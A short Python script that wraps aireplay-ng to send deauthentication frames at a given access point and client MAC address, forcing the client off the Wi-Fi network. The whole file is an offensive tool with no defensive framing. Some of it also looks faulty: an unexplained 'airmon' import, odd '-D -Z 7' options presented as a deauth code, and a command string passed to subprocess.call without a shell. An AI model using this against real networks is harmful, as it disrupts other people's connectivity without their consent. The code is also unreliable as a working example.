import subprocess
from airmon import iface
from sys import argv

ap_mac = argv[1]
station_mac = argv[2]
deauth_code = '7'
opts = '-D -Z {}'.format(deauth_code)

subprocess.call(f'sudo aireplay-ng -0 5 -a {ap_mac} -c {station_mac} {iface} {opts}')